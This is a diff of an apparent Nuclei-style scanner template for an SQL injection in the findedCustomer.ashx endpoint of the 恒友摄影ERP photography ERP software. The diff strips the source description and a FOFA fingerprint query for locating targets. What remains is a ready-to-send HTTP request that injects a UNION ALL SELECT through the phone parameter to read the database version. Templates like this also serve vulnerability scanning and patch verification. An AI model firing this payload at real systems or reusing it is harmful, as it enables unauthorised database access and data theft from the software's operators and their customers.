@@ -3,12 +3,8 @@ info:
   name: 恒友摄影ERP findedCustomer.ashx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mg890r08q2zuq5rf'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mg890r08q2zuq5rf
-    fofa: body="BookChooseDateOrder.html"
 http:
 - raw:
   - 'GET /ashx/findedCustomer.ashx?Method=InitPage&UserID=20130107155124520&ShopID=F0&name=1&phone='')+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+wzLJ HTTP/1.1
